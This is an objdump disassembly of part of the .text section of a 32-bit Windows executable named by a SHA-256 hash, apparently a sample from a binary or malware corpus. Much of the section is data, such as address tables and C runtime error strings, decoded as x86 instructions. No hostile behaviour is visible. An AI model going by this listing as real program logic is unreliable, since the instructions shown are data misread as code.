
ef0e1c8217ff645ec599683ebbef4dad00cea679866fa1a6eebb42efd065bddc.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	lock pop edx
  401006:	inc    eax
  401007:	add    BYTE PTR [eax-0x4fffbfd3],ah
  40100d:	sub    eax,0x2dc00040
  401012:	inc    eax
  401013:	add    BYTE PTR [eax+0x402d],al
  401019:	add    BYTE PTR [eax],al
  40101b:	add    BYTE PTR [eax],al
  40101d:	add    BYTE PTR [eax],al
  40101f:	add    BYTE PTR [eax],ah
  401021:	pop    edx
  401022:	inc    eax
  401023:	add    BYTE PTR [eax+0x5e],al
  401026:	inc    eax
  401027:	add    BYTE PTR [eax],al
  401029:	add    BYTE PTR [eax],al
  40102b:	add    BYTE PTR [eax-0x5fffffd3],al
  401031:	sub    eax,0x2db00000
  401036:	add    BYTE PTR [eax],al
  401038:	shr    BYTE PTR ds:0x2e200000,0x0
  40103f:	add    BYTE PTR [eax],dh
  401041:	add    BYTE PTR cs:[eax],al
  401044:	inc    eax
  401045:	add    BYTE PTR cs:[eax],al
  401048:	push   eax
  401049:	add    BYTE PTR cs:[eax],al
  40104c:	shr    BYTE PTR [esi],0x0
  40104f:	add    BYTE PTR [eax],dh
  401051:	das    
  401052:	add    BYTE PTR [eax],al
  401054:	push   eax
  401055:	das    
  401056:	add    BYTE PTR [eax],al
  401058:	mov    al,ds:0xe000002f
  40105d:	das    
  40105e:	add    BYTE PTR [eax],al
  401060:	push   eax
  401061:	xor    BYTE PTR [eax],al
  401063:	add    BYTE PTR [eax+0x33],ah
  401066:	add    BYTE PTR [eax],al
  401068:	shl    BYTE PTR [ebx],1
  40106a:	add    BYTE PTR [eax],al
  40106c:	jo     0x4010a2
  40106e:	add    BYTE PTR [eax],al
  401070:	mov    al,ds:0x20000034
  401075:	cmp    eax,0x3da00000
  40107a:	add    BYTE PTR [eax],al
  40107c:	sar    BYTE PTR ds:0x3e700000,0x0
  401083:	add    BYTE PTR [eax],ah
  401085:	inc    edx
  401086:	add    BYTE PTR [eax],al
  401088:	rol    BYTE PTR [edx+0x0],0x0
  40108c:	inc    eax
  40108d:	inc    ebx
  40108e:	add    BYTE PTR [eax],al
  401090:	mov    al,0x45
  401092:	add    BYTE PTR [eax],al
  401094:	jo     0x4010dd
  401096:	add    BYTE PTR [eax],al
  401098:	pusha  
  401099:	dec    ecx
  40109a:	add    BYTE PTR [eax],al
  40109c:	or     BYTE PTR [ecx+0x0],0x0
  4010a0:	jo     0x4010ec
  4010a2:	add    BYTE PTR [eax],al
  4010a4:	ror    BYTE PTR [edx+0x0],0x0
  4010a8:	mov    al,0x50
  4010aa:	add    BYTE PTR [eax],al
  4010ac:	adc    BYTE PTR [ecx+0x0],0x0
  4010b0:	and    BYTE PTR [edx+0x0],bl
  4010b3:	add    al,dh
  4010b5:	pop    edx
  4010b6:	add    BYTE PTR [eax],al
  4010b8:	jo     0x401117
  4010ba:	add    BYTE PTR [eax],al
  4010bc:	sbb    BYTE PTR [ebp+0x0],0x0
  4010c0:	mov    al,0x5d
  4010c2:	add    BYTE PTR [eax],al
  4010c4:	lock pop ebp
  4010c6:	add    BYTE PTR [eax],al
  4010c8:	inc    eax
  4010c9:	pop    esi
  4010ca:	add    BYTE PTR [eax],al
  4010cc:	and    BYTE PTR [edi+0x0],bl
  4010cf:	add    BYTE PTR [eax-0x5fffff9f],dh
  4010d5:	bound  eax,QWORD PTR [eax]
  4010d7:	add    al,ah
  4010d9:	add    BYTE PTR fs:[eax],al
  4010dc:	adc    BYTE PTR [ebp+0x0],ah
  4010df:	add    BYTE PTR [eax+0x65],al
  4010e2:	add    BYTE PTR [eax],al
  4010e4:	push   eax
  4010e5:	add    BYTE PTR gs:[eax],al
  4010e8:	pusha  
  4010e9:	add    BYTE PTR gs:[eax],al
  4010ec:	jo     0x401153
  4010ee:	add    BYTE PTR [eax],al
  4010f0:	and    BYTE PTR [ebp+0x0],0x0
  4010f4:	nop
  4010f5:	add    BYTE PTR gs:[eax],al
  4010f8:	mov    al,ds:0xb0000065
  4010fd:	add    BYTE PTR gs:[eax],al
  401100:	shl    BYTE PTR [ebp+0x0],0x0
  401104:	shl    BYTE PTR [ebp+0x0],1
  401107:	add    al,ah
  401109:	add    BYTE PTR gs:[eax],al
  40110c:	lock add BYTE PTR gs:[eax],al
  401110:	add    BYTE PTR [esi+0x0],ah
  401113:	add    BYTE PTR [eax],dl
  401115:	data16 add BYTE PTR [eax],al
  401118:	and    BYTE PTR [esi+0x0],ah
  40111b:	add    BYTE PTR [eax],dh
  40111d:	data16 add BYTE PTR [eax],al
  401120:	inc    eax
  401121:	data16 add BYTE PTR [eax],al
  401124:	push   eax
  401125:	data16 add BYTE PTR [eax],al
  401128:	pusha  
  401129:	data16 add BYTE PTR [eax],al
  40112c:	jo     0x401194
  40112e:	add    BYTE PTR [eax],al
  401130:	and    BYTE PTR [esi+0x0],0x0
  401134:	nop
  401135:	data16 add BYTE PTR [eax],al
  401138:	mov    al,ds:0xb0000066
  40113d:	data16 add BYTE PTR [eax],al
  401140:	shl    BYTE PTR [esi+0x0],0x0
  401144:	pusha  
  401145:	add    BYTE PTR [bx+si],al
  401148:	shl    BYTE PTR [edi+0x0],0x0
  40114c:	and    BYTE PTR [eax+0x0],ch
  40114f:	add    BYTE PTR [eax],dh
  401151:	push   0x68600000
  401156:	add    BYTE PTR [eax],al
  401158:	nop
  401159:	push   0x68c00000
  40115e:	add    BYTE PTR [eax],al
  401160:	sub    BYTE PTR [eax+eax*1+0x0],0xc0
  401165:	ins    BYTE PTR es:[edi],dx
  401166:	add    BYTE PTR [eax],al
  401168:	loopne 0x4011d6
  40116a:	add    BYTE PTR [eax],al
  40116c:	adc    BYTE PTR [ebp+0x0],ch
  40116f:	add    BYTE PTR [eax+0x6e],al
  401172:	add    BYTE PTR [eax],al
  401174:	sub    BYTE PTR [esi+0x0],0x0
  401178:	shr    BYTE PTR [esi+0x0],0x0
  40117c:	add    BYTE PTR [edi+0x0],ch
  40117f:	add    BYTE PTR [eax],dl
  401181:	outs   dx,DWORD PTR ds:[esi]
  401182:	add    BYTE PTR [eax],al
  401184:	and    BYTE PTR [edi+0x0],ch
  401187:	add    al,al
  401189:	outs   dx,DWORD PTR ds:[esi]
  40118a:	add    BYTE PTR [eax],al
  40118c:	loopne 0x4011fd
  40118e:	add    BYTE PTR [eax],al
  401190:	adc    BYTE PTR [eax+0x0],dh
  401193:	add    BYTE PTR [eax+0x71],dl
  401196:	add    BYTE PTR [eax],al
  401198:	pusha  
  401199:	jno    0x40119b
  40119b:	add    BYTE PTR [eax+0x71],dh
  40119e:	add    BYTE PTR [eax],al
  4011a0:	jo     0x401133
  4011a2:	inc    eax
  4011a3:	add    al,al
  4011a5:	xchg   ecx,eax
  4011a6:	inc    eax
	...
  4011af:	add    BYTE PTR [eax+0x52],dl
  4011b2:	dec    edi
  4011b3:	push   eax
  4011b4:	push   ebx
  4011b5:	pop    ecx
  4011b6:	push   ebx
  4011b7:	cs fs ins BYTE PTR es:[edi],dx
  4011ba:	ins    BYTE PTR es:[edi],dx
  4011bb:	add    BYTE PTR [eax],al
  4011bd:	add    BYTE PTR [eax],al
  4011bf:	add    BYTE PTR [ebp+edx*2+0x49],al
  4011c3:	aaa    
  4011c4:	xor    BYTE PTR [esi],ch
  4011c6:	fs ins BYTE PTR es:[edi],dx
  4011c8:	ins    BYTE PTR es:[edi],dx
  4011c9:	add    BYTE PTR [eax],al
  4011cb:	add    BYTE PTR [eax-0x1fffbf98],dl
  4011d1:	outs   dx,DWORD PTR ds:[esi]
  4011d2:	inc    eax
  4011d3:	add    al,al
  4011d5:	push   0x6fe00040
  4011da:	inc    eax
  4011db:	add    BYTE PTR [eax+0x68],ah
  4011de:	inc    eax
  4011df:	add    BYTE PTR [eax-0x4fffbfa3],dh
  4011e5:	pop    ebp
  4011e6:	inc    eax
  4011e7:	add    al,al
  4011e9:	ins    BYTE PTR es:[edi],dx
  4011ea:	inc    eax
  4011eb:	add    al,ah
  4011ed:	ins    BYTE PTR es:[edi],dx
  4011ee:	inc    eax
  4011ef:	add    BYTE PTR [eax],dl
  4011f1:	ins    DWORD PTR es:[edi],dx
  4011f2:	inc    eax
  4011f3:	add    BYTE PTR [eax+0x68],ah
  4011f6:	inc    eax
  4011f7:	add    BYTE PTR [eax],al
  4011f9:	outs   dx,DWORD PTR ds:[esi]
  4011fa:	inc    eax
  4011fb:	add    BYTE PTR [eax+0x6e],al
  4011fe:	inc    eax
  4011ff:	add    al,al
  401201:	ins    BYTE PTR es:[edi],dx
  401202:	inc    eax
  401203:	add    al,ah
  401205:	ins    BYTE PTR es:[edi],dx
  401206:	inc    eax
  401207:	add    BYTE PTR [eax],dl
  401209:	ins    DWORD PTR es:[edi],dx
  40120a:	inc    eax
  40120b:	add    BYTE PTR [edi+0x65],ah
  40120e:	outs   dx,BYTE PTR ds:[esi]
  40120f:	gs jb  0x40127b
  401212:	arpl   WORD PTR [eax],ax
  401214:	jne    0x401284
  401216:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  40121a:	outs   dx,BYTE PTR ds:[esi]
  40121b:	and    BYTE PTR [ebp+0x72],ah
  40121e:	jb     0x40128f
  401220:	jb     0x401222
  401222:	add    BYTE PTR [eax],al
  401224:	pusha  
  401225:	push   0x6f100040
  40122a:	inc    eax
  40122b:	add    BYTE PTR [eax-0x3fffbf92],al
  401231:	ins    BYTE PTR es:[edi],dx
  401232:	inc    eax
  401233:	add    al,ah
  401235:	ins    BYTE PTR es:[edi],dx
  401236:	inc    eax
  401237:	add    BYTE PTR [eax],dl
  401239:	ins    DWORD PTR es:[edi],dx
  40123a:	inc    eax
  40123b:	add    BYTE PTR [ecx+0x6f],ch
  40123e:	jae    0x4012b4
  401240:	jb     0x4012a7
  401242:	popa   
  401243:	ins    DWORD PTR es:[edi],dx
  401244:	add    BYTE PTR [eax],al
  401246:	add    BYTE PTR [eax],al
  401248:	imul   ebp,DWORD PTR [edi+0x73],0x61657274
  40124f:	ins    DWORD PTR es:[edi],dx
  401250:	and    BYTE PTR [ebx+0x74],dh
  401253:	jb     0x4012ba
  401255:	popa   
  401256:	ins    DWORD PTR es:[edi],dx
  401257:	and    BYTE PTR [ebp+0x72],ah
  40125a:	jb     0x4012cb
  40125c:	jb     0x40125e
  40125e:	add    BYTE PTR [eax],al
  401260:	pusha  
  401261:	push   0x6f200040
  401266:	inc    eax
  401267:	add    al,al
  401269:	outs   dx,BYTE PTR ds:[esi]
  40126a:	inc    eax
  40126b:	add    BYTE PTR [eax-0x1fffbf94],al
  401271:	ins    BYTE PTR es:[edi],dx
  401272:	inc    eax
  401273:	add    BYTE PTR [eax],dl
  401275:	ins    DWORD PTR es:[edi],dx
  401276:	inc    eax
  401277:	add    BYTE PTR [ebx+0x79],dh
  40127a:	jae    0x4012f0
  40127c:	gs ins DWORD PTR es:[edi],dx
  40127e:	add    BYTE PTR [eax],al
  401280:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
  401287:	and    BYTE PTR [ebx+0x74],dh
  40128a:	jb     0x4012f5
  40128c:	outs   dx,BYTE PTR ds:[esi]
  40128d:	and    BYTE PTR [bx+si+0x6f],dh
  401291:	jae    0x4012fc
  401293:	je     0x4012fe
  401295:	outs   dx,DWORD PTR ds:[esi]
  401296:	outs   dx,BYTE PTR ds:[esi]
  401297:	add    BYTE PTR [ebx+0x74],dh
  40129a:	jb     0x401305
  40129c:	outs   dx,BYTE PTR ds:[esi]
  40129d:	and    BYTE PTR [si+0x6f],dh
  4012a1:	outs   dx,DWORD PTR ds:[esi]
  4012a2:	and    BYTE PTR [edi+ebp*2+0x6e],ch
  4012a6:	add    BYTE PTR [di],al
  4012a9:	add    BYTE PTR [eax],al
  4012ab:	add    BYTE PTR [eax],al
  4012ad:	adc    eax,0xb70040
  4012b2:	add    BYTE PTR [eax],al
  4012b4:	adc    al,0x15
  4012b6:	inc    eax
  4012b7:	add    BYTE PTR [eax+eax*1],dl
  4012ba:	add    BYTE PTR [eax],al
  4012bc:	and    BYTE PTR ds:0x6f0040,dl
  4012c2:	add    BYTE PTR [eax],al
  4012c4:	xor    BYTE PTR ds:0xaa0040,dl
  4012ca:	add    BYTE PTR [eax],al
  4012cc:	inc    esp
  4012cd:	adc    eax,0x8e0040
  4012d2:	add    BYTE PTR [eax],al
  4012d4:	inc    esp
  4012d5:	adc    eax,0x520040
  4012da:	add    BYTE PTR [eax],al
  4012dc:	add    BYTE PTR ds:0x3f30040,dl
  4012e2:	add    BYTE PTR [eax],al
  4012e4:	pop    esp
  4012e5:	adc    eax,0x3f40040
  4012ea:	add    BYTE PTR [eax],al
  4012ec:	pop    esp
  4012ed:	adc    eax,0x3f50040
  4012f2:	add    BYTE PTR [eax],al
  4012f4:	pop    esp
  4012f5:	adc    eax,0x100040
  4012fa:	add    BYTE PTR [eax],al
  4012fc:	add    BYTE PTR ds:0x370040,dl
  401302:	add    BYTE PTR [eax],al
  401304:	and    BYTE PTR ds:0x9640040,dl
  40130a:	add    BYTE PTR [eax],al
  40130c:	inc    esp
  40130d:	adc    eax,0x910040
  401312:	add    BYTE PTR [eax],al
  401314:	push   0xb004015
  401319:	add    DWORD PTR [eax],eax
  40131b:	add    BYTE PTR [ebp+edx*1+0x40],bh
  40131f:	add    BYTE PTR [eax+0x0],dh
  401322:	add    BYTE PTR [eax],al
  401324:	nop
  401325:	adc    eax,0x500040
  40132a:	add    BYTE PTR [eax],al
  40132c:	adc    al,0x15
  40132e:	inc    eax
  40132f:	add    BYTE PTR [edx],al
  401331:	add    BYTE PTR [eax],al
  401333:	add    BYTE PTR [ebp+edx*1+0x270040],ah
  40133a:	add    BYTE PTR [eax],al
  40133c:	nop
  40133d:	adc    eax,0xc0040
  401342:	add    BYTE PTR [eax],al
  401344:	add    BYTE PTR ds:0xf0040,dl
  40134a:	add    BYTE PTR [eax],al
  40134c:	and    BYTE PTR ds:0x10040,dl
  401352:	add    BYTE PTR [eax],al
  401354:	rcl    BYTE PTR ds:0x60040,0x0
  40135b:	add    BYTE PTR [ebp+edx*1+0x40],bh
  40135f:	add    BYTE PTR [ebx+0x0],bh
  401362:	add    BYTE PTR [eax],al
  401364:	jl     0x40137b
  401366:	inc    eax
  401367:	add    BYTE PTR [ecx],ah
  401369:	add    BYTE PTR [eax],al
  40136b:	add    al,bl
  40136d:	adc    eax,0xd40040
  401372:	add    BYTE PTR [eax],al
  401374:	fcom   DWORD PTR ds:0x830040
  40137a:	add    BYTE PTR [eax],al
  40137c:	jl     0x401393
  40137e:	inc    eax
  40137f:	add    dh,ah
  401381:	add    eax,DWORD PTR [eax]
  401383:	add    BYTE PTR [eax],al
  401385:	adc    eax,0x80040
  40138a:	add    BYTE PTR [eax],al
  40138c:	in     al,dx
  40138d:	adc    eax,0x150040
  401392:	add    BYTE PTR [eax],al
  401394:	add    BYTE PTR [esi],dl
  401396:	inc    eax
  401397:	add    BYTE PTR [ecx],dl
  401399:	add    BYTE PTR [eax],al
  40139b:	add    BYTE PTR [eax],ah
  40139d:	push   ss
  40139e:	inc    eax
  40139f:	add    BYTE PTR [esi+0x0],ch
  4013a2:	add    BYTE PTR [eax],al
  4013a4:	pop    esp
  4013a5:	adc    eax,0x9610040
  4013aa:	add    BYTE PTR [eax],al
  4013ac:	inc    esp
  4013ad:	adc    eax,0x3e30040
  4013b2:	add    BYTE PTR [eax],al
  4013b4:	xor    al,0x16
  4013b6:	inc    eax
  4013b7:	add    BYTE PTR [esi],cl
  4013b9:	add    BYTE PTR [eax],al
  4013bb:	add    ah,ch
  4013bd:	adc    eax,0x30040
  4013c2:	add    BYTE PTR [eax],al
  4013c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013c5:	adc    eax,0x1e0040
  4013ca:	add    BYTE PTR [eax],al
  4013cc:	pop    esp
  4013cd:	adc    eax,0x4d50040
  4013d2:	add    BYTE PTR [eax],al
  4013d4:	add    BYTE PTR [esi],dl
  4013d6:	inc    eax
  4013d7:	add    BYTE PTR [ecx],bl
  4013d9:	add    BYTE PTR [eax],al
  4013db:	add    BYTE PTR [ebp+edx*1+0x40],bl
  4013df:	add    BYTE PTR [eax],ah
  4013e1:	add    BYTE PTR [eax],al
  4013e3:	add    BYTE PTR [eax],al
  4013e5:	adc    eax,0x40040
  4013ea:	add    BYTE PTR [eax],al
  4013ec:	dec    eax
  4013ed:	push   ss
  4013ee:	inc    eax
  4013ef:	add    BYTE PTR ds:0x5c000000,bl
  4013f5:	adc    eax,0x130040
  4013fa:	add    BYTE PTR [eax],al
  4013fc:	add    BYTE PTR ds:0x271d0040,dl
  401402:	add    BYTE PTR [eax],al
  401404:	pop    esp
  401405:	push   ss
  401406:	inc    eax
  401407:	add    BYTE PTR [eax+0x27],al
  40140a:	add    BYTE PTR [eax],al
  40140c:	jo     0x401424
  40140e:	inc    eax
  40140f:	add    BYTE PTR [ecx+0x27],al
  401412:	add    BYTE PTR [eax],al
  401414:	adc    BYTE PTR [esi],0x40
  401417:	add    BYTE PTR [edi],bh
  401419:	daa    
  40141a:	add    BYTE PTR [eax],al
  40141c:	cwde   
  40141d:	push   ss
  40141e:	inc    eax
  40141f:	add    BYTE PTR ds:0xb8000027,dh
  401425:	push   ss
  401426:	inc    eax
  401427:	add    BYTE PTR [ecx],bl
  401429:	daa    
  40142a:	add    BYTE PTR [eax],al
  40142c:	fcom   DWORD PTR [esi]
  40142e:	inc    eax
  40142f:	add    BYTE PTR [ebp+0x27],al
  401432:	add    BYTE PTR [eax],al
  401434:	in     al,dx
  401435:	push   ss
  401436:	inc    eax
  401437:	add    BYTE PTR [ebp+0x27],cl
  40143a:	add    BYTE PTR [eax],al
  40143c:	add    BYTE PTR [edi],dl
  40143e:	inc    eax
  40143f:	add    BYTE PTR [esi+0x27],al
  401442:	add    BYTE PTR [eax],al
  401444:	adc    al,0x17
  401446:	inc    eax
  401447:	add    BYTE PTR [edi],dh
  401449:	daa    
  40144a:	add    BYTE PTR [eax],al
  40144c:	sub    BYTE PTR [edi],dl
  40144e:	inc    eax
  40144f:	add    BYTE PTR [esi],bl
  401451:	daa    
  401452:	add    BYTE PTR [eax],al
  401454:	dec    eax
  401455:	pop    ss
  401456:	inc    eax
  401457:	add    BYTE PTR [ecx+0x27],dl
  40145a:	add    BYTE PTR [eax],al
  40145c:	push   esp
  40145d:	pop    ss
  40145e:	inc    eax
  40145f:	add    BYTE PTR [edi+eiz*1],dh
  401462:	add    BYTE PTR [eax],al
  401464:	push   0x14004017
  401469:	daa    
  40146a:	add    BYTE PTR [eax],al
  40146c:	adc    BYTE PTR [edi],0x40
  40146f:	add    BYTE PTR [esi],ah
  401471:	daa    
  401472:	add    BYTE PTR [eax],al
  401474:	mov    WORD PTR [edi],ss
  401476:	inc    eax
  401477:	add    BYTE PTR [eax+0x27],cl
  40147a:	add    BYTE PTR [eax],al
  40147c:	mov    al,ds:0x28004017
  401481:	daa    
  401482:	add    BYTE PTR [eax],al
  401484:	mov    ah,0x17
  401486:	inc    eax
  401487:	add    BYTE PTR [eax],bh
  401489:	daa    
  40148a:	add    BYTE PTR [eax],al
  40148c:	enter  0x4017,0x0
  401490:	dec    edi
  401491:	daa    
  401492:	add    BYTE PTR [eax],al
  401494:	fcom   DWORD PTR [edi]
  401496:	inc    eax
  401497:	add    BYTE PTR [edx+0x27],al
  40149a:	add    BYTE PTR [eax],al
  40149c:	in     al,dx
  40149d:	pop    ss
  40149e:	inc    eax
  40149f:	add    BYTE PTR [edi+eiz*1+0x0],al
  4014a3:	add    ah,bh
  4014a5:	pop    ss
  4014a6:	inc    eax
  4014a7:	add    BYTE PTR [ebx+0x27],al
  4014aa:	add    BYTE PTR [eax],al
  4014ac:	or     al,0x18
  4014ae:	inc    eax
  4014af:	add    BYTE PTR [edi+0x27],al
  4014b2:	add    BYTE PTR [eax],al
  4014b4:	and    BYTE PTR [eax],bl
  4014b6:	inc    eax
  4014b7:	add    BYTE PTR [edx],bh
  4014b9:	daa    
  4014ba:	add    BYTE PTR [eax],al
  4014bc:	xor    BYTE PTR [eax],bl
  4014be:	inc    eax
  4014bf:	add    BYTE PTR [ecx+0x27],cl
  4014c2:	add    BYTE PTR [eax],al
  4014c4:	inc    esp
  4014c5:	sbb    BYTE PTR [eax+0x0],al
  4014c8:	ss daa 
  4014ca:	add    BYTE PTR [eax],al
  4014cc:	push   esp
  4014cd:	sbb    BYTE PTR [eax+0x0],al
  4014d0:	cmp    eax,0x64000027
  4014d5:	sbb    BYTE PTR [eax+0x0],al
  4014d8:	cmp    esp,DWORD PTR [edi]
  4014da:	add    BYTE PTR [eax],al
  4014dc:	jl     0x4014f6
  4014de:	inc    eax
  4014df:	add    BYTE PTR [ecx],bh
  4014e1:	daa    
  4014e2:	add    BYTE PTR [eax],al
  4014e4:	xchg   esp,eax
  4014e5:	sbb    BYTE PTR [eax+0x0],al
  4014e8:	dec    esp
  4014e9:	daa    
  4014ea:	add    BYTE PTR [eax],al
  4014ec:	test   al,0x18
  4014ee:	inc    eax
  4014ef:	add    BYTE PTR [ebx],dh
  4014f1:	daa    
  4014f2:	add    BYTE PTR [eax],al
  4014f4:	mov    ah,0x18
  4014f6:	inc    eax
	...
  4014ff:	add    BYTE PTR [eax+0x65],dh
  401502:	jb     0x401571
  401504:	imul   esi,DWORD PTR [ebx+0x73],0x206e6f69
  40150b:	fs outs dx,BYTE PTR gs:[esi]
  40150e:	imul   esp,DWORD PTR [ebp+0x64],0x66000000
  401515:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x73697865
  40151d:	je     0x401592
  40151f:	add    BYTE PTR [esi+0x6f],ch
  401522:	and    BYTE PTR [ebx+0x75],dh
  401525:	arpl   WORD PTR [eax+0x20],bp
  401528:	fs gs jbe 0x401595
  40152c:	arpl   WORD PTR [ebp+0x0],sp
  40152f:	add    BYTE PTR [esi+0x69],ah
  401532:	ins    BYTE PTR es:[edi],dx
  401533:	outs   dx,BYTE PTR gs:[esi]
  401535:	popa   
  401536:	ins    DWORD PTR es:[edi],dx
  401537:	and    BYTE PTR gs:[edi+ebp*2+0x6f],dh
  40153c:	and    BYTE PTR [edi+ebp*2+0x6e],ch
  401540:	add    BYTE PTR [bx+si],al
  401543:	add    BYTE PTR [ebp+eiz*2+0x76],ah
  401547:	imul   esp,DWORD PTR [ebx+0x65],0x20726f20
  40154e:	jb     0x4015b5
  401550:	jae    0x4015c1
  401552:	jne    0x4015c6
  401554:	arpl   WORD PTR [ebp+0x20],sp
  401557:	bound  esi,QWORD PTR [ebp+0x73]
  40155a:	jns    0x40155c
  40155c:	imul   ebp,DWORD PTR [edi+0x20],0x6f727265
  401563:	jb     0x401565
  401565:	add    BYTE PTR [eax],al
  401567:	add    BYTE PTR [ecx+ebp*2+0x72],ah
  40156b:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  401570:	jns    0x401592
  401572:	outs   dx,BYTE PTR ds:[esi]
  401573:	outs   dx,DWORD PTR ds:[esi]
  401574:	je     0x401596
  401576:	gs ins DWORD PTR es:[edi],dx
  401578:	jo     0x4015ee
  40157a:	jns    0x40157c
  40157c:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
  401583:	and    BYTE PTR [ecx+0x72],ah
  401586:	addr16 jne 0x4015f6
  401589:	outs   dx,BYTE PTR gs:[esi]
  40158b:	je     0x40158d
  40158d:	add    BYTE PTR [eax],al
  40158f:	add    BYTE PTR [esi+0x6f],ch
  401592:	and    BYTE PTR [ebx+0x70],dh
  401595:	popa   
  401596:	arpl   WORD PTR [ebp+0x20],sp
  401599:	outs   dx,DWORD PTR ds:[esi]
  40159a:	outs   dx,BYTE PTR ds:[esi]
  40159b:	and    BYTE PTR [ebp+eiz*2+0x76],ah
  40159f:	imul   esp,DWORD PTR [ebx+0x65],0x6f6e0000
  4015a6:	and    BYTE PTR [ebx+0x75],dh
  4015a9:	arpl   WORD PTR [eax+0x20],bp
  4015ac:	imul   bp,WORD PTR [ebp+eiz*2+0x20],0x726f
  4015b3:	and    BYTE PTR [ecx+ebp*2+0x72],ah
  4015b7:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  4015bc:	jns    0x4015be
  4015be:	add    BYTE PTR [eax],al
  4015c0:	data16 jne 0x401631
  4015c3:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  4015c7:	outs   dx,BYTE PTR ds:[esi]
  4015c8:	and    BYTE PTR [esi+0x6f],ch
  4015cb:	je     0x4015ed
  4015cd:	jae    0x401644
  4015cf:	jo     0x401641
  4015d1:	outs   dx,DWORD PTR ds:[esi]
  4015d2:	jb     0x401648
  4015d4:	gs add BYTE PTR fs:[eax],al
  4015d8:	outs   dx,BYTE PTR ds:[esi]
  4015d9:	outs   dx,DWORD PTR ds:[esi]
  4015da:	and    BYTE PTR [edi+ebp*2+0x63],ch
  4015de:	imul   esp,DWORD PTR [eax],0x61
  4015e1:	jbe    0x401644
  4015e3:	imul   ebp,DWORD PTR [ecx+eiz*2+0x62],0x656c
  4015eb:	add    BYTE PTR [esi+0x6f],ch
  4015ee:	je     0x401610
  4015f0:	outs   dx,BYTE PTR gs:[esi]
  4015f2:	outs   dx,DWORD PTR ds:[esi]
  4015f3:	jne    0x40165c
  4015f5:	push   0x6d656d20
  4015fa:	outs   dx,DWORD PTR ds:[esi]
  4015fb:	jb     0x401676
  4015fd:	add    BYTE PTR [eax],al
  4015ff:	add    BYTE PTR [edx+0x65],dh
  401602:	jae    0x401673
  401604:	jne    0x401678
  401606:	arpl   WORD PTR [ebp+0x20],sp
  401609:	jne    0x401679
  40160b:	popa   
  40160c:	jbe    0x40166f
  40160e:	imul   ebp,DWORD PTR [ecx+eiz*2+0x62],0x7420656c
  401616:	jb     0x401691
  401618:	and    BYTE PTR [ecx+0x67],ah
  40161b:	popa   
  40161c:	imul   ebp,DWORD PTR [esi+0x0],0x6f726300
  401623:	jae    0x401698
  401625:	and    BYTE PTR [ebp+eiz*2+0x76],ah
  401629:	imul   esp,DWORD PTR [ebx+0x65],0x6e696c20
  401630:	imul   eax,DWORD PTR [eax],0x0
  401633:	add    BYTE PTR [edi+0x70],ch
  401636:	gs jb  0x40169a
  401639:	je     0x4016a4
  40163b:	outs   dx,DWORD PTR ds:[esi]
  40163c:	outs   dx,BYTE PTR ds:[esi]
  40163d:	and    BYTE PTR [ebx+0x61],ah
  401640:	outs   dx,BYTE PTR ds:[esi]
  401641:	arpl   WORD PTR [ebp+0x6c],sp
  401644:	gs add BYTE PTR fs:[eax],al
  401648:	je     0x4016b9
  40164a:	outs   dx,DWORD PTR ds:[esi]
  40164b:	and    BYTE PTR [ebp+0x61],ch
  40164e:	outs   dx,BYTE PTR ds:[esi]
  40164f:	jns    0x401671
  401651:	imul   bp,WORD PTR [ebp+eiz*2+0x73],0x6f20
  401658:	jo     0x4016bf
  40165a:	outs   dx,BYTE PTR ds:[esi]
  40165b:	add    BYTE PTR [eax+0x65],dh
  40165e:	jb     0x4016cd
  401660:	imul   esi,DWORD PTR [ebx+0x73],0x5f6e6f69
  401667:	fs outs dx,BYTE PTR gs:[esi]
  40166a:	imul   esp,DWORD PTR [ebp+0x64],0x61000000
  401671:	fs fs jb 0x4016da
  401675:	jae    0x4016ea
  401677:	pop    edi
  401678:	imul   ebp,DWORD PTR [esi+0x5f],0x657375
  40167f:	add    BYTE PTR [ecx+0x64],ah
  401682:	fs jb  0x4016ea
  401685:	jae    0x4016fa
  401687:	pop    edi
  401688:	outs   dx,BYTE PTR ds:[esi]
  401689:	outs   dx,DWORD PTR ds:[esi]
  40168a:	je     0x4016eb
  40168c:	popa   
  40168d:	jbe    0x4016f0
  40168f:	imul   ebp,DWORD PTR [ecx+eiz*2+0x62],0x656c
  401697:	add    BYTE PTR [ecx+0x64],ah
  40169a:	fs jb  0x401702
  40169d:	jae    0x401712
  40169f:	pop    edi
  4016a0:	popaw  
  4016a2:	ins    DWORD PTR es:[edi],dx
  4016a3:	imul   ebp,DWORD PTR [ecx+edi*2+0x5f],0x5f746f6e
  4016ab:	jae    0x401722
  4016ad:	jo     0x40171f
  4016af:	outs   dx,DWORD PTR ds:[esi]
  4016b0:	jb     0x401726
  4016b2:	gs add BYTE PTR fs:[eax],al
  4016b6:	add    BYTE PTR [eax],al
  4016b8:	arpl   WORD PTR [edi+0x6e],bp
  4016bb:	outs   dx,BYTE PTR ds:[esi]
  4016bc:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4016c1:	outs   dx,BYTE PTR ds:[esi]
  4016c2:	pop    edi
  4016c3:	popa   
  4016c4:	ins    BYTE PTR es:[edi],dx
  4016c5:	jb     0x40172c
  4016c7:	popa   
  4016c8:	fs jns 0x40172a
  4016cb:	imul   ebp,DWORD PTR [esi+0x5f],0x676f7270
  4016d2:	jb     0x401739
  4016d4:	jae    0x401749
  4016d6:	add    BYTE PTR [eax],al
  4016d8:	bound  esp,QWORD PTR [ecx+0x64]
  4016db:	pop    edi
  4016dc:	imul   bp,WORD PTR [ebp+eiz*2+0x5f],0x6564
  4016e3:	jae    0x401748
  4016e5:	jb     0x401750
  4016e7:	jo     0x40175d
  4016e9:	outs   dx,DWORD PTR ds:[esi]
  4016ea:	jb     0x4016ec
  4016ec:	arpl   WORD PTR [edi+0x6e],bp
  4016ef:	outs   dx,BYTE PTR ds:[esi]
  4016f0:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4016f5:	outs   dx,BYTE PTR ds:[esi]
  4016f6:	pop    edi
  4016f7:	popa   
  4016f8:	bound  ebp,QWORD PTR [edi+0x72]
  4016fb:	je     0x401762
